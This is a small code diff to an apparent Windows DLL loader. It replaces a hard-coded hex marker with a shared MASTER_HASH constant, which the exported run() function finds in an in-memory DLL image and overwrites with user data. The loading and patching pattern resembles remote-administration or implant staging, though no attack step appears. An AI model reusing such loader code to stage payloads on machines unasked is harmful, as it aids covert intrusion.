@@ -8,6 +8,7 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include "../common/hash.h"
 
 #ifdef _DEBUG
 #define Mprintf printf
@@ -262,8 +263,7 @@ extern DLL_API DWORD WINAPI run(LPVOID param) {
 	if (dllData == NULL) return -1;
 	void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (NULL == execMem) return -2;
-	char find[] = "61f04dd637a74ee34493fc1025de2c131022536da751c29e3ff4e9024d8eec43";
-	int offset = MemoryFind(dllData, find, size, sizeof(find)-1);
+	int offset = MemoryFind(dllData, MASTER_HASH, size, sizeof(MASTER_HASH)-1);
 	if (offset != -1) {
 		memcpy(dllData + offset, info->User, 64);
 	}
